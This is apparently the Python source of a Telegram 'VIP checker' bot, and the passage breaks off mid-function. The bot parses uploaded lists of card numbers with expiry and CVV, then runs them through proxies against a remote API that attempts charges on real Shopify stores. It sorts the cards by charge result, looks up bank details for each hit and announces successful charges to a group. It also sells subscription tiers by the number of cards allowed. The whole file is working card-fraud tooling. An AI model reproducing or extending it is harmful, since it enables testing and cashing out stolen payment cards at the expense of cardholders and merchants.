# ==============================================================================
# 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 𝐕𝐈𝐏 𝐁𝐎𝐓 - 𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐏𝐑𝐎𝐃𝐔𝐂𝐓𝐈𝐎𝐍 𝐒𝐘𝐒𝐓𝐄 SYSTEM 
# (PREMIUM NATIVE CUSTOM EMOJI ENGINE, FORCED GIF ENGINE, COLORED BUTTONS)
# ==============================================================================
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import io
import sys
import logging
from html import unescape
from datetime import datetime, timedelta
from urllib.parse import urlparse
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.error import RetryAfter, Conflict, TimedOut, NetworkError, Forbidden, BadRequest
from telegram.constants import ParseMode

from database2 import (
    init_db, ensure_user, get_user_plan, set_user_plan,
    get_all_user_proxies, add_proxy_db, remove_proxy_by_index,
    clear_all_proxies, mark_user_joined
)

# Logging configuration
logging.basicConfig(stream=sys.stdout, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger("VIP_BOT")

# ====================== CONFIG & GLOBALS ======================
BOT_TOKEN = os.getenv('BOT_TOKEN', '').strip()
ADMIN_ID = [int(x.strip()) for x in os.getenv("ADMIN_ID", "8879293808").split(",") if x.strip()]

JOIN_CHANNEL_ID = os.getenv("JOIN_CHANNEL_ID", "0").strip()
JOIN_GROUP_ID = os.getenv("JOIN_GROUP_ID", "0").strip()
HITS_GROUP_ID = os.getenv("HITS_GROUP_ID", "0").strip()

JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "").strip()
JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "").strip()
HITS_GROUP_LINK = os.getenv("HITS_GROUP_LINK", "").strip()

def get_valid_target(link, chat_id):
    l = str(link).strip()
    c = str(chat_id).strip()
    if "t.me/" in l and "+" not in l and "joinchat" not in l:
        uname = l.split("t.me/")[-1].split("/")[0].split("?")[0]
        return f"@{uname}"
    if l.startswith("@"): return l
    if c and c not in ["0", "", "none", "None"]:
        if c.isdigit(): c = f"-100{c}" 
        try: return int(c)
        except ValueError: return c
    return None

JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)

# APIs
SHOPIFY_API_URL = 'https://autosh.up.railway.app/shopii'
GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
KEYS_FILE = "redeem_keys.json"

WORKERS = 40  
DELAY = 1.0  
HIT_DELAY = 1.0

_SITE_ERRORS_COUNT = {}
_MAX_SITE_ERRORS = 3
_JOIN_CACHE = {}
_MAINTENANCE_MODE = False

_USER_NAMES = {}
USER_LAST_REQ = {}
ACTIVE_MTXT_PROCESSES = {}
PENDING_FILES = {}

# ====================== SAFE CHARGED FONT ENGINE & TAG PROTECTION ======================
def sf(text) -> str:
    if text is None: return ""
    res = ""
    in_tag = False
    for c in str(text):
        if c == '<':
            in_tag = True
            res += c
            continue
        if c == '>':
            in_tag = False
            res += c
            continue
        if in_tag:
            res += c
            continue
            
        if 'A' <= c <= 'Z': res += chr(ord(c) - 65 + 0x1D5D4)
        elif 'a' <= c <= 'z': res += chr(ord(c) - 97 + 0x1D5EE)
        elif '0' <= c <= '9': res += chr(ord(c) - 48 + 0x1D7CE)
        else: res += c
    return res

def unsf(text) -> str:
    if text is None: return ""
    res = ""
    for c in str(text):
        o = ord(c)
        if 0x1D5D4 <= o <= 0x1D5ED: res += chr(o - 0x1D5D4 + 65)
        elif 0x1D5EE <= o <= 0x1D607: res += chr(o - 0x1D5EE + 97)
        elif 0x1D7CE <= o <= 0x1D7D7: res += chr(o - 0x1D7CE + 48)
        else: res += c
    return res

def escape_html(text):
    if not text: return "Unknown"
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

# ====================== NATIVE TELEGRAM PREMIUM CUSTOM EMOJIS ======================
CE_CASH = '<tg-emoji emoji-id="5409048419211682843">💵</tg-emoji>'
CE_PARTY = '<tg-emoji emoji-id="5461151367559141950">🎉</tg-emoji>'
CE_CROWN = '<tg-emoji emoji-id="5217822164362739968">👑</tg-emoji>'
CE_DIAMOND = '<tg-emoji emoji-id="5427168083074628963">💎</tg-emoji>'
CE_FLY = '<tg-emoji emoji-id="5231005931550030290">💸</tg-emoji>'
CE_CANDLE = '<tg-emoji emoji-id="5451882707875276247">🕯</tg-emoji>'
CE_TOP = '<tg-emoji emoji-id="5415655814079723871">🔝</tg-emoji>'
CE_GEAR = '<tg-emoji emoji-id="5341715473882955310">⚙️</tg-emoji>'
CE_SNOW = '<tg-emoji emoji-id="5449449325434266744">❄️</tg-emoji>'
CE_BOOM = '<tg-emoji emoji-id="5276032951342088188">💥</tg-emoji>'
CE_MIC = '<tg-emoji emoji-id="5224736245665511429">🎤</tg-emoji>'
CE_SMILE = '<tg-emoji emoji-id="5461117441612462242">🙂</tg-emoji>'
CE_CHART = '<tg-emoji emoji-id="5246762912428603768">📉</tg-emoji>'
CE_GLASSES = '<tg-emoji emoji-id="5391112412445288650">🥸</tg-emoji>'
CE_CLOWN = '<tg-emoji emoji-id="5269531045165816230">🤡</tg-emoji>'

# ====================== FLAGS ======================
ALL_COUNTRY_CODES = ["AE","AF","AR","AT","AU","BE","BG","BR","CA","CH","CL","CN","CO","CR","CZ","DE","DK","DZ","EC","EE","EG","ES","FI","FR","GB","GR","HK","HR","HU","ID","IE","IL","IN","IT","JP","KR","KW","KZ","LB","LT","LU","LV","MA","MT","MX","MY","NG","NL","NO","NZ","OM","PA","PE","PH","PK","PL","PT","QA","RO","RS","RU","SA","SE","SG","SI","SK","TH","TR","TW","UA","US","UY","VN","ZA"]
COUNTRY_FLAGS = {code: chr(ord(code[0]) + 127397) + chr(ord(code[1]) + 127397) for code in ALL_COUNTRY_CODES}

def get_flag_emoji(country_code, fallback="🏳️"):
    if not country_code or len(country_code) != 2: return fallback
    c = country_code.upper()
    return COUNTRY_FLAGS.get(c, chr(ord(c[0]) + 127397) + chr(ord(c[1]) + 127397) if c.isalpha() else fallback)

# ====================== BULLETPROOF i.giphy DIRECT CDN LINKS ======================
WELCOME_GIF = "https://i.giphy.com/3o7aD2d7hy9ktXNDP2.gif"
REDEEM_GIF = "https://i.giphy.com/l41YkxvU8c7J7Bba0.gif"
ANIME_GIFS = [
    "https://i.giphy.com/1n4iuWZFnTeN6qvdpD.gif",
    "https://i.giphy.com/11KzOet1ElBDz2.gif",
    "https://i.giphy.com/4ilFRqgbzbx4c.gif",
    "https://i.giphy.com/xT1R9yebNpKAAJjH0s.gif",
    "https://i.giphy.com/108BDeJ2BvtZRu.gif"
]

PLANS = {
    "plan1": {"name": "Core Access", "tier": "Core", "duration_days": 7, "price": "$5.00"},
    "plan2": {"name": "Elite Access", "tier": "Elite", "duration_days": 15, "price": "$10.00"},
    "plan3": {"name": "Root Access", "tier": "Root", "duration_days": 30, "price": "$15.00"},
    "plan4": {"name": "X-Access", "tier": "X", "duration_days": 60, "price": "$25.00"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X"]

_GIF_FILE_IDS = {}
_system_locks = {}

def get_system_lock(name: str):
    if name not in _system_locks: _system_locks[name] = asyncio.Lock()
    return _system_locks[name]

async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Exception in update: {context.error}")

def is_valid_url(link):
    return link and str(link).strip().startswith("http")

# ====================== BULLETPROOF GIF DOWNLOADER & ENGINE ======================
async def fetch_gif_bytes(url):
    try:
        async with aiohttp.ClientSession() as session:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
            async with session.get(url, headers=headers, timeout=15) as resp:
                if resp.status == 200:
                    bio = io.BytesIO(await resp.read())
                    bio.name = "animation.gif"
                    return bio
    except Exception as e: logger.error(f"Failed to fetch GIF: {e}")
    return None

async def send_forced_gif(target_func, text, markup, url):
    media_to_send = _GIF_FILE_IDS.get(url, url)
    try:
        msg = await target_func(
            animation=media_to_send, caption=text, reply_markup=markup,
            parse_mode=ParseMode.HTML, read_timeout=40, write_timeout=40
        )
        if url not in _GIF_FILE_IDS and getattr(msg, 'animation', None):
            _GIF_FILE_IDS[url] = msg.animation.file_id
        return msg
    except Exception:
        gif_io = await fetch_gif_bytes(url)
        if gif_io:
            try:
                msg = await target_func(
                    animation=gif_io, caption=text, reply_markup=markup,
                    parse_mode=ParseMode.HTML, read_timeout=60, write_timeout=60
                )
                if getattr(msg, 'animation', None):
                    _GIF_FILE_IDS[url] = msg.animation.file_id
                return msg
            except Exception: pass
    try:
        if hasattr(target_func, '__self__') and hasattr(target_func.__self__, 'reply_text'):
            return await target_func.__self__.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except: pass
    return None

async def styled_reply(update: Update, text: str, buttons=None, use_gif=True, specific_gif=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    target = update.callback_query.message if update.callback_query else update.message
    if not target: return None
    url = specific_gif or random.choice(ANIME_GIFS)
    if use_gif or specific_gif: return await send_forced_gif(target.reply_animation, text, markup, url)
    try: return await target.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception: return None

async def styled_edit(msg, text, buttons=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    try:
        if msg.animation or msg.photo or msg.video or msg.document: 
            return await msg.edit_caption(caption=text, reply_markup=markup, parse_mode=ParseMode.HTML)
        return await msg.edit_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception: return None

async def styled_send(bot, chat_id, text, buttons=None, use_gif=True, specific_gif=None):
    markup = InlineKeyboardMarkup(buttons) if buttons else None
    url = specific_gif or random.choice(ANIME_GIFS)
    async def _bot_send_anim(**kwargs): return await bot.send_animation(chat_id=chat_id, **kwargs)
    if use_gif or specific_gif: return await send_forced_gif(_bot_send_anim, text, markup, url)
    try: return await bot.send_message(chat_id=chat_id, text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception: return None

# ====================== DATABASE & LIMITS ======================
async def load_keys():
    async with get_system_lock("keys"):
        if os.path.exists(KEYS_FILE):
            try:
                async with aiofiles.open(KEYS_FILE, 'r', encoding='utf-8') as f:
                    c = await f.read()
                    if c: return json.loads(c)
            except Exception: pass
        return {}

async def save_keys(keys_data):
    async with get_system_lock("keys"):
        try:
            async with aiofiles.open(KEYS_FILE, 'w', encoding='utf-8') as f:
                await f.write(json.dumps(keys_data, indent=4))
        except Exception: pass

def get_cc_limit(plan, uid=0):
    if uid in ADMIN_ID: return 50000
    plan_lower = str(plan).lower() if plan else "bronze"
    if "x" in plan_lower: return 10000
    if "root" in plan_lower: return 5000
    if "elite" in plan_lower: return 3000
    if "core" in plan_lower: return 1000
    return 15

def is_paid_plan(plan):
    return plan and plan.lower() in [p.lower() for p in PAID_TIERS]

# ====================== SESSIONS & EXTRACTION ======================
_USER_HTTP_SESSIONS = {}
async def get_user_http_session(uid):
    key = f"{uid}_msp"
    if key not in _USER_HTTP_SESSIONS or _USER_HTTP_SESSIONS[key].closed:
        connector = aiohttp.TCPConnector(limit=WORKERS + 10, ssl=False, enable_cleanup_closed=True, force_close=True)
        _USER_HTTP_SESSIONS[key] = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=90, connect=30, sock_read=80), connector=connector)
    return _USER_HTTP_SESSIONS[key]

async def cleanup_user_http_session(uid):
    key = f"{uid}_msp"
    session = _USER_HTTP_SESSIONS.pop(key, None)
    if session and not session.closed:
        try: await session.close()
        except Exception: pass

def extract_cc(text):
    if not text: return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        y = '20' + y if len(y) == 2 else y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text): cards.append(f"{c}|{m}|y|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text): cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))

def parse_proxy_format(proxy):
    proxy = proxy.strip()
    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    pt, proxy = (pm.group(1).lower(), pm.group(2)) if pm else ('http', proxy)
    if re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy): u, pw, h, p = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy).groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy): h, p, u, pw = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy).groups()
    elif re.match(r'^([^:@]+):(\d+)$', proxy): h, p = re.match(r'^([^:@]+):(\d+)$', proxy).groups(); u = pw = ''
    else: return None
    if not h or not p: return None
    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}

_CACHED_SHOPIFY_SITES = []
_LAST_SITES_FETCH = 0

async def get_shopify_sites():
    global _CACHED_SHOPIFY_SITES, _LAST_SITES_FETCH
    now = time.time()
    if _CACHED_SHOPIFY_SITES and (now - _LAST_SITES_FETCH < 600): return _CACHED_SHOPIFY_SITES
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(GITHUB_SITES_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=10) as r:
                if r.status == 200:
                    _CACHED_SHOPIFY_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await r.text()).split('\n') if l.strip()]))
                    _LAST_SITES_FETCH = now
    except Exception: pass
    if not _CACHED_SHOPIFY_SITES and os.path.exists('sites.txt'):
        try:
            async with aiofiles.open('sites.txt', 'r', encoding='utf-8') as f:
                _CACHED_SHOPIFY_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await f.read()).split('\n') if l.strip()]))
        except Exception: pass
    return _CACHED_SHOPIFY_SITES

# ====================== SMART SITE DEAD FILTER ======================
def is_dead_site_error(err):
    if not err: return True
    e = str(err).lower()
    bad_keywords = [
        'step 0', 'step 0 failed', 'step 1', 'step 1 failed', 'missing stable', 'missing stablei',
        'max ret', 'cloudflare', 'timed out', 'bad gateway', 'service unavailable', 
        'gateway timeout', 'site dead', 'session_error'
    ]
    return any(k in e for k in bad_keywords)

# ====================== SECURITY & FORCE JOIN ======================
async def is_user_joined(uid, bot):
    targets = [t for t in [JOIN_CHANNEL_TARGET, JOIN_GROUP_TARGET] if t]
    if not targets: return True
    for target in targets:
        try:
            try: cid = int(target)
            except ValueError: cid = target
            member = await bot.get_chat_member(chat_id=cid, user_id=uid)
            if member.status in ['left', 'kicked', 'banned']: return False
        except Exception: pass 
    return True

async def send_welcome_menu(update_or_bot, uid, plan, limit):
    admin_panel = f"\n\n<b>{CE_GLASSES} {sf('Admin Panel')}:</b>\n ├ {CE_CANDLE} /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ {CE_CANDLE} /validate {sf('[key]')} - {sf('Check Key')}\n ├ {CE_CANDLE} /users - {sf('System Status')}\n ╰ {CE_CANDLE} /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
    
    t = f"""<b>━━━ {CE_CROWN} {sf('VIP CHECKER SYSTEM')} {CE_CROWN} ━━━</b>

<b>{CE_TOP} {sf('Checker Engine')}:</b>
 ╰ <i>{sf('Send a combo file to auto-start mass check')}</i>

<b>{CE_GEAR} {sf('Proxy Manager')}:</b>
 ├ {CE_CANDLE} /addpxy - {sf('Add Proxies')}
 ├ {CE_CANDLE} /proxy - {sf('View Proxies')}
 ╰ {CE_CANDLE} /rmpxy - {sf('Remove Proxies')}

<b>{CE_DIAMOND} {sf('Account Settings')}:</b>
 ├ {CE_CANDLE} /info - {sf('Profile Info')}
 ├ {CE_CANDLE} /redeem - {sf('Redeem Key')}
 ├ {CE_CANDLE} /fb - {sf('Send Feedback')}
 ╰ {CE_CANDLE} /plan - {sf('View Subscriptions')}{admin_panel}

<b>{CE_SMILE} {sf('Your Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Free')} ({sf(str(limit))} {sf('CC Limit')})</code>"""
    
    kb = [[InlineKeyboardButton(sf("View Plans"), callback_data="show_plans", style="primary")]]
    
    if is_valid_url(JOIN_CHANNEL_LINK) and is_valid_url(JOIN_GROUP_LINK):
        kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK, style="primary"), InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK, style="primary")])
    elif is_valid_url(JOIN_CHANNEL_LINK):
        kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK, style="primary")])
    elif is_valid_url(JOIN_GROUP_LINK):
        kb.append([InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK, style="primary")])
        
    if isinstance(update_or_bot, Update):
        await styled_reply(update_or_bot, t, buttons=kb, use_gif=True, specific_gif=WELCOME_GIF)
    else:
        await styled_send(update_or_bot, uid, t, buttons=kb, use_gif=True, specific_gif=WELCOME_GIF)

async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in ADMIN_ID: return True
    now = time.time()
    if uid in _JOIN_CACHE and now - _JOIN_CACHE[uid] < 600: return True
    
    is_joined = await is_user_joined(uid, context.bot)
    if is_joined:
        _JOIN_CACHE[uid] = now
        return True
        
    kb = []
    if is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK, style="primary")])
    if is_valid_url(JOIN_GROUP_LINK): kb.append([InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK, style="primary")])
    if kb: kb.append([InlineKeyboardButton(sf("Verify"), callback_data="check_joined", style="success")])
    
    await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>\n\n├ {sf('You must join our official channels first.')}\n╰ {sf('Please join, then click Verify.')}", buttons=kb, use_gif=True)
    return False

# ====================== GATEWAY APIs ======================
async def get_bin_info(bin_code):
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_code[:6]}") as r:
                if r.status == 200:
                    d = await r.json()
                    return {"brand": d.get("brand", "-"), "type": d.get("type", "-"), "level": d.get("level", "-"), "bank": d.get("bank", "-"), "country": d.get("country_name", "-"), "country_code": d.get("country", ""), "flag": d.get("country_flag", "")}
    except Exception: pass
    return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}

# SHOPIFY API
async def check_shopify_api(card, site, proxy, session):
    try:
        proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
        proxy_param = f"&proxy={proxy_str}" if proxy else ""
        req_url = f"{SHOPIFY_API_URL}?cc={card}&site={site}{proxy_param}"
        
        async with session.get(req_url, timeout=90) as resp:
            text_data = await resp.text()
            if resp.status != 200: return {'status': 'Site Error', 'message': f'Server Error {resp.status}', 'card': card, 'retry': True}
            try: rj = json.loads(text_data)
            except Exception: return {'status': 'Site Error', 'message': 'Format Error', 'card': card, 'retry': True}
            
        rm = str(rj.get('Response', '')).strip()
        pr = rj.get('Price', '-')
        gt = rj.get('Gateway', 'Shopify')
        st = str(rj.get('Status', '')).strip().lower()
        rl = rm.lower()
        
        if is_dead_site_error(rm) or any(k in rl for k in ['proxy', 'timeout', 'error', 'session']):
            return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}

        if 'insufficient' in rl or 'funds' in rl or 'balance' in rl:
            return {'status': 'Insufficient', 'message': 'insufficient_funds', 'card': card, 'gateway': gt, 'price': pr}

        if '3d' in rl or 'secure' in rl or 'otp' in rl:
            return {'status': 'Approved', 'message': '3d_secure_required', 'card': card, 'gateway': gt, 'price': pr}
        if 'approved' in rl or any(k in rl for k in ['invalid_cvv', 'match']): 
            return {'status': 'Approved', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}

        if st == 'true' or 'success' in rl or 'charged' in rl or 'completed' in rl: 
            return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': gt, 'price': pr}
            
        return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
    except asyncio.TimeoutError: return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
    except Exception as e: return {'status': 'Site Error', 'message': f'Error: {str(e)[:20]}', 'card': card, 'retry': True}

# Core Checker Function
async def check_card_with_retry(card, sites, proxies, session, gateway_name, max_retries=2):
    lr = None; ap = list(proxies) if proxies else []
    for _ in range(max_retries):
        p = random.choice(ap) if ap else None
        
        acs = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS]
        if not acs: 
            _SITE_ERRORS_COUNT.clear(); acs = sites
        s = random.choice(acs) if acs else ""
        
        if gateway_name == "Shopify":
            r = await check_shopify_api(card, s, p, session)
        else:
            return {'status': 'Dead', 'message': 'Unknown Gateway', 'card': card}
            
        if r.get('status') == 'Site Error':
            _SITE_ERRORS_COUNT[s] = _SITE_ERRORS_COUNT.get(s, 0) + 1
            
        if not r.get('retry'):
            if r.get('status') in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
                _SITE_ERRORS_COUNT[s] = 0
            return r
        lr = r; await asyncio.sleep(DELAY)
        
    if lr: return {'status': 'Dead', 'message': f'{str(lr["message"])[:40]}', 'card': card, 'gateway': gateway_name, 'price': lr.get('price', '-')}
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': gateway_name, 'price': '-'}

# ====================== RESULTS FORMATTER ENGINE ======================
def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
    bi = bin_info or {}
    ps = sf(f"{str(price)}") if price and price != "-" else sf("-")
    
    h = f"<b>{CE_CROWN} {sf('PAYMENT SUCCEEDED')} {CE_PARTY}</b>"
    
    country_code = str(bi.get('country_code', '')).strip()
    flag = get_flag_emoji(country_code) if country_code else "🏳️"
    cd = f"{sf(bi.get('country', '-'))} {flag}"
    
    return f"""{h}

<b>{CE_DIAMOND} {sf('Card')}:</b> <code>{card}</code>

<b>{CE_BOOM} {sf('Response')}:</b> <code>{sf('Payment Succeeded')}</code>

<b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gateway)}</code>
<b>{CE_CASH} {sf('Price')}:</b> <code>{ps}</code>

<b>{CE_GEAR} {sf('Bank Info')}:</b>
 ├ <b>{sf('Bank')}:</b> <code>{sf(bi.get('bank', '-'))}</code>
 ├ <b>{sf('Country')}:</b> <code>{cd}</code>
 ├ <b>{sf('Brand')}:</b> <code>{sf(bi.get('brand', '-'))}</code>
 ╰ <b>{sf('Type')}:</b> <code>{sf(bi.get('type', '-'))} - {sf(bi.get('level', '-'))}</code>

<b>{CE_CHART} {sf('Took')}:</b> <code>{sf(f'{elapsed:.2f}s')}</code>"""

async def _send_global_hit(gateway, price, uid, bot, elapsed):
    if not HITS_GROUP_TARGET: return
    try:
        user_name = _USER_NAMES.get(uid, f"User {uid}")
        safe_name = escape_html(sf(user_name))
        plan = await get_user_plan(uid)
        plan_name = plan.title() if plan else "Free"
        ps = f" {sf(f'{str(price)}')}" if price and str(price) != "-" else ""
        
        h = f"<b>{CE_CROWN} {sf('PAYMENT SUCCEEDED')} {CE_PARTY}</b>"
        
        text = f"""{h}

<b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gateway)}</code>{ps}
<b>{CE_BOOM} {sf('Response')}:</b> <code>{sf('Payment Succeeded')}</code>
<b>{CE_CHART} {sf('Took')}:</b> <code>{sf(f'{elapsed:.2f}s')}</code>
<b>{CE_SMILE} {sf('User')}:</b> <a href="tg://user?id={uid}">{safe_name}</a> (<code>{sf(plan_name)}</code>)"""

        try: cid = int(HITS_GROUP_TARGET)
        except ValueError: cid = HITS_GROUP_TARGET
        await bot.send_message(chat_id=cid, text=text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception: pass

async def _send_mass_hit(card, gateway, price, uid, elapsed, bot):
    await asyncio.sleep(HIT_DELAY)
    try:
        bi = await get_bin_info(card.split("|")[0])
        msg = format_card_result(card, gateway, price, bi, elapsed)
        kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt", style="primary")]]
        await styled_send(bot, uid, msg, buttons=kb, use_gif=True)
    except Exception: pass

# ====================== CENTRALIZED CORE ROUTER ======================
async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE
    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
    uid = update.effective_user.id
    pm = await styled_reply(update, f"<b>{CE_CANDLE} {sf('Processing file data...')}</b>", use_gif=True)
    try:
        if uid in ACTIVE_MTXT_PROCESSES and not ACTIVE_MTXT_PROCESSES[uid].get("stopped", True): 
            return await styled_edit(pm, f"<b>{CE_BOOM} {sf('A process is already active! Please wait for it to finish.')}</b>")
        doc = update.message.document
        if doc.file_size > 3 * 1024 * 1024: 
            return await styled_edit(pm, f"<b>{CE_BOOM} {sf('File too large! (Max 3MB)')}</b>")
        if not await force_join_check(update, context): 
            try: await pm.delete()
            except Exception: pass
            return
        db_proxies = await get_all_user_proxies(uid)
        if len(db_proxies) == 0: 
            return await styled_edit(pm, f"<b>{CE_CLOWN} {sf('You must add proxies before checking! Use /addpxy to add.')}</b>")
        
        f = await context.bot.get_file(doc.file_id)
        fp = f"temp_{uid}_{int(time.time())}.txt"
        await f.download_to_drive(fp)
        
        try:
            async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as file: content = await file.read()
        except Exception:
            async with aiofiles.open(fp, "r", encoding="latin-1", errors="ignore") as file: content = await file.read()
            
        if os.path.exists(fp): os.remove(fp)
        
        cards = extract_cc(content)
        if not cards: return await styled_edit(pm, f"<b>{CE_CLOWN} {sf('No valid cards found in the file.')}</b>")
        
        cl = get_cc_limit(await get_user_plan(uid), uid)
        if len(cards) > cl: cards = cards[:cl]
        PENDING_FILES[uid] = cards
        
        kb = [
            [InlineKeyboardButton(sf("Shopify (Charge)"), callback_data="gate:Shopify", style="success")],
            [InlineKeyboardButton(sf("Cancel"), callback_data="gate:cancel", style="danger")]
        ]
        await styled_edit(pm, f"<b>{CE_CROWN} {sf('File Loaded Successfully')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Total CCs')}:</b> <code>{sf(str(len(cards)))}</code>\n╰ <b>{CE_TOP} {sf('Please select a Gateway to start')}:</b>", buttons=kb)
    except Exception as e: await styled_edit(pm, f"<b>{CE_CLOWN} {sf('Error')}:</b> {sf(str(e))}")

async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _MAINTENANCE_MODE
    if not update.message: return
    uid = update.effective_user.id
    
    USER_LAST_REQ[uid] = time.time()
    _USER_NAMES[uid] = update.effective_user.first_name or str(uid)
    
    raw_text = update.message.text or update.message.caption or ""
    
    if not re.match(r'^[/.][a-zA-Z0-9]', raw_text):
        if update.message.document:
            mime = update.message.document.mime_type or ""
            fname = update.message.document.file_name or ""
            if mime.startswith('text/') or mime == 'application/octet-stream' or fname.endswith('.txt'):
                await auto_file_check_cmd(update, context)
        return

    tokens = raw_text.split()
    cmd = tokens[0][1:].lower().split('@')[0] 
    args = tokens[1:]

    if cmd in ["start", "cmds", "commands"]:
        if _MAINTENANCE_MODE and uid not in ADMIN_ID: 
            return await styled_reply(update, f"<b>{CE_GEAR} {sf('System Maintenance')}</b>\n\n├ {sf('The bot is currently undergoing upgrades.')}\n╰ {sf('Please try again later.')}", use_gif=True)
        if not await force_join_check(update, context): return
        await ensure_user(uid)
        plan = await get_user_plan(uid)
        limit = get_cc_limit(plan, uid)
        await send_welcome_menu(update, uid, plan, limit)

    elif cmd == "info":
        if not await force_join_check(update, context): return
        await ensure_user(uid)
        plan = await get_user_plan(uid)
        limit = get_cc_limit(plan, uid)
        t = f"""<b>{CE_CROWN} {sf('Profile Information')}</b>

├ <b>{sf('ID')}:</b> <code>{sf(str(uid))}</code>
├ <b>{CE_SMILE} {sf('Status')}:</b> <code>{sf('Active') if is_paid_plan(plan) else sf('Free')}</code>
├ <b>{CE_DIAMOND} {sf('Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Bronze')}</code>
╰ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(limit))} {sf('CCs')}</code>"""
        await styled_reply(update, t, use_gif=True)

    elif cmd == "plan":
        if not await force_join_check(update, context): return
        cp = await get_user_plan(uid)
        t = f"<b>{CE_CROWN} {sf('VIP Subscription Plans')}</b>\n\n"
        for _, pi in PLANS.items():
